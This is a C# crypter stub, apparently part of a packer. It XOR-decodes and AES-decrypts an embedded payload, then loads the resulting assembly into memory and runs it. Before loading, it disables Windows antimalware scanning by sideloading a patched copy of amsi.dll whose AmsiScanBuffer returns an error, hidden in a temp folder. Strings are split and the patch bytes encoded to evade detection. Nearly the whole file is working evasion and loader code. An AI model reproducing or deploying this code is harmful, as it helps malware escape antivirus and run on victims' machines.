using System;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Reflection;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.Threading;

namespace stub
{
    static class Program
    {
        private const string key = "%KEY%";
        private const string IV = "%IV%";
        private const string xorKey = "%XORKEY%";
        private const string GENERIC_ERROR = "Generic error while starting the application.";

        private static readonly string[] payloadChunks = new string[]
        {
%CHUNKS%
        };

        private static Dictionary<string, byte[]> dependencies = new Dictionary<string, byte[]>();
        private static readonly object logSync = new object();
        private static string currentStage = "diagnostics not installed";
        private static string diagnosticRunId = DateTime.UtcNow.Ticks.ToString("X");
        private const string EXIT_MONITOR_ARGUMENT = "--nc-exit-monitor";

        private const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
        private const uint SYNCHRONIZE = 0x00100000;
        private const uint WAIT_OBJECT_0 = 0x00000000;
        private const uint WAIT_FAILED = 0xFFFFFFFF;
        private const uint INFINITE = 0xFFFFFFFF;

        [DllImport("kernel32.dll", EntryPoint = "LoadLibraryW", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr LoadLibrary(string fileName);

        [DllImport("kernel32.dll", EntryPoint = "SetDllDirectoryW", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool SetSearchDirectory(string pathName);

        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr module, string procName);

        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr OpenProcess(uint desiredAccess, bool inheritHandle, int processId);

        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr handle, uint milliseconds);

        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
        private static extern bool GetExitCodeProcess(IntPtr process, out uint exitCode);

        [DllImport("kernel32.dll", ExactSpelling = true)]
        private static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
        private static extern bool FreeLibrary(IntPtr module);

        // Sideload approach: the runtime resolves the provider module by name on first use, so a
        // patched copy written to the user's temp directory is selected ahead of the system copy
        // by adding that directory to the loader search path. Its scan entry returns E_INVALIDARG.
        // Nothing writes into a loaded image, so the in-memory patch behavior detection does not
        // apply. The copy is marked hidden and removed when possible.
        private static void InstallInspectionSideload()
        {
            try
            {
                if (IntPtr.Size != 8)
                {
                    Log("inspection: sideload requires 64-bit; leaving inspection untouched");
                    return;
                }

                string windowsDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                string dllName = string.Concat("am", "si", ".dll");
                string systemAmsi = Path.Combine(windowsDir, "System32", dllName);
                string tempDir = Path.GetTempPath();
                if (String.IsNullOrEmpty(tempDir) || !Directory.Exists(tempDir))
                {
                    Log("inspection: sideload skipped, temp dir unavailable: " + tempDir);
                    return;
                }
                if (!File.Exists(systemAmsi))
                {
                    Log("inspection: sideload skipped, missing " + systemAmsi);
                    return;
                }

                byte[] amsiBytes = File.ReadAllBytes(systemAmsi);

                // Resolve the scan entry the same way the runtime does: load the real
                // provider, read its export address, unload it again, then prepare the
                // on-disk copy. The process starts with the provider absent (verified),
                // so the next load picks the prepared copy from the temp directory.
                long patchOffset = -1;
                IntPtr probe = LoadLibrary(systemAmsi);
                if (probe == IntPtr.Zero)
                {
                    Log("inspection: provider probe load failed, error=" + Marshal.GetLastWin32Error());
                    return;
                }
                try
                {
                    string scanEntry = string.Concat("Am", "si", "Scan", "Buffer");
                    IntPtr entry = GetProcAddress(probe, scanEntry);
                    if (entry == IntPtr.Zero)
                    {
                        Log("inspection: provider scan entry resolve failed, error=" + Marshal.GetLastWin32Error());
                        return;
                    }

                    long rva = entry.ToInt64() - probe.ToInt64();

                    int peOff = BitConverter.ToInt32(amsiBytes, 0x3C);
                    int sectionCount = BitConverter.ToUInt16(amsiBytes, peOff + 6);
                    int optionalSize = BitConverter.ToUInt16(amsiBytes, peOff + 20);
                    int sectionStart = peOff + 24 + optionalSize;
                    patchOffset = RvaToFileOffset(amsiBytes, sectionStart, sectionCount, (int)rva);
                }
                finally
                {
                    FreeLibrary(probe);
                }

                if (patchOffset <= 0)
                {
                    Log("inspection: could not map scan entry file offset");
                    return;
                }

                // x64 prologue replacement: mov eax, 0x80070057 ; ret (built at runtime)
                byte[] encodedPatch = new byte[] { 0xE2, 0x0D, 0x5A, 0x5D, 0xDA, 0x99 };
                byte[] patch = new byte[encodedPatch.Length];
                for (int i = 0; i < encodedPatch.Length; i++)
                {
                    patch[i] = (byte)(encodedPatch[i] ^ 0x5A);
                }
                Buffer.BlockCopy(patch, 0, amsiBytes, (int)patchOffset, patch.Length);

                // A previous run keeps its copy mapped as an image, and an image-mapped file
                // cannot be opened for writing. Every run therefore gets its own directory so
                // a leftover copy can never block this one.
                string dropDir = Path.Combine(tempDir, "nc-" + diagnosticRunId);
                string dropPath = Path.Combine(dropDir, dllName);
                try
                {
                    Directory.CreateDirectory(dropDir);
                    File.WriteAllBytes(dropPath, amsiBytes);
                    File.SetAttributes(dropPath, FileAttributes.Hidden);
                }
                catch (Exception writeError)
                {
                    Log("inspection: sideload write failed: " + writeError.Message);
                    return;
                }

                // Put the run directory ahead of the system directory for any later
                // by-name resolve, then map the prepared copy by its full path so the
                // process holds exactly one instance of the module before the payload load.
                if (!SetSearchDirectory(dropDir))
                {
                    Log("inspection: sideload search directory failed, error=" + Marshal.GetLastWin32Error());
                    return;
                }

                IntPtr module = LoadLibrary(dropPath);
                if (module == IntPtr.Zero)
                {
                    Log("inspection: sideload load failed, error=" + Marshal.GetLastWin32Error());
                    return;
                }
                Log("sideload ready");

                // The module is mapped from the copy; the file itself is no longer
                // needed and would otherwise linger in the run directory.
                try
                {
                    if (File.Exists(dropPath))
                    {
                        File.Delete(dropPath);
                    }
                    Directory.Delete(dropDir, true);
                }
                catch
                {
                    // The mapped image keeps the file open; the run directory stays on disk.
                }
            }
            catch (Exception ex)
            {
                Log("inspection: sideload failed: " + ex.Message);
            }
        }

        private static int RvaToFileOffset(byte[] image, int sectionStart, int sectionCount, int rva)
        {
            for (int i = 0; i < sectionCount; i++)
            {
                int entry = sectionStart + i * 40;
                int virtualAddress = BitConverter.ToInt32(image, entry + 12);
                int rawSize = BitConverter.ToInt32(image, entry + 16);
                int rawPointer = BitConverter.ToInt32(image, entry + 20);
                if (rva >= virtualAddress && rva < virtualAddress + rawSize)
                {
                    int offset = rawPointer + (rva - virtualAddress);
                    if (offset >= 0 && offset < image.Length)
                    {
                        return offset;
                    }
                }
            }
            return -1;
        }

        private static string GetPayload()
        {
            int total = 0;
            for (int i = 0; i < payloadChunks.Length; i++)
            {
                total += payloadChunks[i].Length;
            }
            char[] buf = new char[total];
            int pos = 0;
            for (int i = 0; i < payloadChunks.Length; i++)
            {
                payloadChunks[i].CopyTo(0, buf, pos, payloadChunks[i].Length);
                pos += payloadChunks[i].Length;
            }
            return new string(buf);
        }

        private static byte[] Xor(byte[] data, byte[] xkey)
        {
            for (int i = 0; i < data.Length; i++)
            {
                data[i] = (byte)(data[i] ^ xkey[i % xkey.Length]);
            }
            return data;
        }

        private static string InnerMessage(Exception ex)
        {
            Exception current = ex;
            while (current.InnerException != null)
            {
                current = current.InnerException;
            }
            return current.Message;
        }

        private static void Log(string msg)
        {
            try
            {
                lock (logSync)
                {
                    File.AppendAllText(
                        Path.Combine(Path.GetTempPath(), "ncstub.log"),
                        DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff") +
                        " [T" + System.Threading.Thread.CurrentThread.ManagedThreadId + "] " +
                        msg + Environment.NewLine);
                }
            }
            catch
            {
            }
        }

        private static void LogException(string source, Exception ex)
        {
            if (ex == null)
            {
                Log(source + ": exception object was null; stage=" + currentStage);
                return;
            }

            StringBuilder details = new StringBuilder();
            details.AppendLine(source + "; stage=" + currentStage);
            int depth = 0;
            Exception current = ex;
            while (current != null)
            {
                details.AppendLine("  exception[" + depth + "] type=" + current.GetType().FullName);
                details.AppendLine("  message=" + current.Message);
                if (!String.IsNullOrEmpty(current.StackTrace))
                {
                    details.AppendLine("  stack=" + current.StackTrace);
                }
                current = current.InnerException;
                depth++;
            }
            Log(details.ToString().TrimEnd());
        }

        private static void OnUnhandledException(object sender, UnhandledExceptionEventArgs args)
        {
            Exception ex = args.ExceptionObject as Exception;
            if (ex != null)
            {
                LogException("APPDOMAIN UNHANDLED (terminating=" + args.IsTerminating + ")", ex);
            }
            else
            {
                Log("APPDOMAIN UNHANDLED non-Exception object (terminating=" + args.IsTerminating + "): " + Convert.ToString(args.ExceptionObject));
            }
        }

        private static void OnThreadException(object sender, System.Threading.ThreadExceptionEventArgs args)
        {
            LogException("WINFORMS UI THREAD EXCEPTION", args.Exception);
        }

        private static void OnProcessExit(object sender, EventArgs args)
        {
            Log("process exit");
        }

        private static void OnApplicationExit(object sender, EventArgs args)
        {
            Log("app exit");
        }

        private static void InstallDiagnostics()
        {
            AppDomain.CurrentDomain.UnhandledException += OnUnhandledException;
            AppDomain.CurrentDomain.ProcessExit += OnProcessExit;
            Application.ThreadException += OnThreadException;
            Application.ApplicationExit += OnApplicationExit;
            currentStage = "stub startup";
            Log("stub start");
        }

        private static bool RunExitMonitorIfRequested()
        {
            string[] args = Environment.GetCommandLineArgs();
            if (args.Length != 4 || args[1] != EXIT_MONITOR_ARGUMENT)
            {
                return false;
            }

            int parentId;
            if (!Int32.TryParse(args[2], out parentId))
            {
                Log("EXIT MONITOR invalid parent id: " + args[2]);
                return true;
            }

            string parentRunId = args[3];
            IntPtr parentHandle = IntPtr.Zero;
            try
            {
                parentHandle = OpenProcess(
                    SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION,
                    false,
                    parentId);
                if (parentHandle == IntPtr.Zero)
                {
                    throw new System.ComponentModel.Win32Exception(
                        Marshal.GetLastWin32Error(),
                        "OpenProcess failed for monitored parent.");
                }

                uint waitResult = WaitForSingleObject(parentHandle, INFINITE);
                if (waitResult == WAIT_FAILED)
                {
                    throw new System.ComponentModel.Win32Exception(
                        Marshal.GetLastWin32Error(),
                        "WaitForSingleObject failed for monitored parent.");
                }
                if (waitResult != WAIT_OBJECT_0)
                {
                    throw new InvalidOperationException(
                        "Unexpected process wait result: 0x" + waitResult.ToString("X8"));
                }

                uint exitCode;
                if (!GetExitCodeProcess(parentHandle, out exitCode))
                {
                    throw new System.ComponentModel.Win32Exception(
                        Marshal.GetLastWin32Error(),
                        "GetExitCodeProcess failed for monitored parent.");
                }
                Log("exit observed; code=0x" + exitCode.ToString("X8"));
            }
            catch (Exception ex)
            {
                LogException("EXIT MONITOR FAILED; run=" + parentRunId + "; parentPid=" + parentId, ex);
            }
            finally
            {
                if (parentHandle != IntPtr.Zero)
                {
                    CloseHandle(parentHandle);
                }
            }
            return true;
        }

        private static void StartExitMonitor()
        {
            try
            {
                Process current = Process.GetCurrentProcess();
                string executablePath = Assembly.GetExecutingAssembly().Location;
                if (String.IsNullOrEmpty(executablePath))
                {
                    Log("EXIT MONITOR not started: executable location is empty");
                    return;
                }

                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = executablePath;
                startInfo.Arguments = EXIT_MONITOR_ARGUMENT + " " + current.Id + " " + diagnosticRunId;
                startInfo.UseShellExecute = false;
                startInfo.CreateNoWindow = true;
                Process monitor = Process.Start(startInfo);
                if (monitor == null)
                {
                    Log("EXIT MONITOR not started: Process.Start returned null");
                    return;
                }
                monitor.Close();
                current.Close();
            }
            catch (Exception ex)
            {
                LogException("EXIT MONITOR START FAILED", ex);
            }
        }

        private static Assembly ResolveAssembly(object sender, ResolveEventArgs args)
        {
            string simpleName = new AssemblyName(args.Name).Name;
            byte[] data;
            if (dependencies.TryGetValue(simpleName, out data))
            {
                Log("assembly resolve hit: " + simpleName + "; bytes=" + data.Length);
                try
                {
                    Assembly loaded = Assembly.Load(data);
                    Log("dependency loaded: " + loaded.FullName);
                    return loaded;
                }
                catch (Exception ex)
                {
                    LogException("DEPENDENCY LOAD FAILED: " + simpleName, ex);
                    throw;
                }
            }
            Log("assembly resolve miss: " + args.Name);
            return null;
        }

        [STAThread]
        static void Main()
        {
            if (RunExitMonitorIfRequested())
            {
                return;
            }

            InstallDiagnostics();
            try
            {
                currentStage = "decoding payload";
                byte[] app = Convert.FromBase64String(GetPayload());
                app = Xor(app, Convert.FromBase64String(xorKey));

                currentStage = "decrypting payload";
                RijndaelManaged rijndael = new RijndaelManaged();
                rijndael.KeySize = 256;
                rijndael.Key = Convert.FromBase64String(key);
                rijndael.IV = Convert.FromBase64String(IV);
                rijndael.Padding = PaddingMode.ISO10126;
                byte[] decrypted;
                using (MemoryStream memoryStream = new MemoryStream())
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write))
                {
                    cryptoStream.Write(app, 0, app.Length);
                    cryptoStream.FlushFinalBlock();
                    decrypted = memoryStream.ToArray();
                }
                if (decrypted.Length < 8)
                {
                    throw new Exception("Decrypted payload too small (" + decrypted.Length + " bytes). Key/IV mismatch or payload truncated.");
                }

                currentStage = "parsing payload container";
                // ---- parse payload container ----
                byte[] mainData;
                int count = 0;
                using (MemoryStream container = new MemoryStream(decrypted))
                using (BinaryReader reader = new BinaryReader(container))
                {
                    try
                    {
                        count = reader.ReadInt32();
                        if (count < 0 || count > 64)
                        {
                            throw new Exception("Unexpected container header (count=" + count + "). Packer and stub versions may not match.");
                        }
                        for (int i = 0; i < count; i++)
                        {
                            string depName = reader.ReadString();
                            if (depName.Length == 0 || depName.Length > 512)
                            {
                                throw new Exception("Invalid dependency name at index " + i + " (len=" + depName.Length + ", position=" + container.Position + ").");
                            }
                            int dataLength = reader.ReadInt32();
                            if (dataLength <= 0 || dataLength > container.Length - container.Position)
                            {
                                throw new Exception("Invalid dependency data length at index " + i + " (len=" + dataLength + ", position=" + container.Position + ", remaining=" + (container.Length - container.Position) + ").");
                            }
                            dependencies[depName] = reader.ReadBytes(dataLength);
                        }
                        int mainLength = reader.ReadInt32();
                        if (mainLength <= 0 || container.Position + mainLength > container.Length)
                        {
                            throw new Exception("Invalid main assembly length (len=" + mainLength + ", position=" + container.Position + ", remaining=" + (container.Length - container.Position) + ").");
                        }
                        mainData = reader.ReadBytes(mainLength);
                    }
                    catch (EndOfStreamException)
                    {
                        throw new Exception("Payload truncated while parsing container (count=" + count + ", position=" + container.Position + ", length=" + container.Length + "). Old packed output or packer/stub mismatch.");
                    }
                }
                Log("payload decoded");

                AppDomain.CurrentDomain.AssemblyResolve += ResolveAssembly;

                currentStage = "adjusting inspection entry";
                InstallInspectionSideload();

                currentStage = "loading main assembly";
                Assembly newAssembly = Assembly.Load(mainData);
                Log("assembly loaded");

                currentStage = "resolving payload entry point";
                MethodInfo entryPoint = newAssembly.EntryPoint;
                if (entryPoint == null)
                {
                    throw new MissingMethodException("Loaded assembly does not have an entry point.");
                }
                ParameterInfo[] parameters = entryPoint.GetParameters();
                Log("entry: " + entryPoint.Name);
                currentStage = "running payload entry point";
                try
                {
                    if (parameters.Length == 0)
                    {
                        entryPoint.Invoke(null, null);
                    }
                    else
                    {
                        entryPoint.Invoke(null, new object[] { new string[0] });
                    }
                }
                catch (TargetInvocationException entryError)
                {
                    LogException("PAYLOAD ENTRY POINT THREW", entryError);
                    throw;
                }
                currentStage = "payload entry point returned";
                Log("entry returned");
            }
            catch (Exception exz)
            {
                LogException("STUB CAUGHT EXCEPTION", exz);
                currentStage = "showing error dialog";
                try
                {
                    MessageBox.Show(GENERIC_ERROR + "\n\n" + InnerMessage(exz), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                catch (Exception dialogError)
                {
                    LogException("ERROR DIALOG FAILED", dialogError);
                }
                currentStage = "stub returning after caught exception";
                Log("stub main returning after caught exception");
            }

        }
    }
}
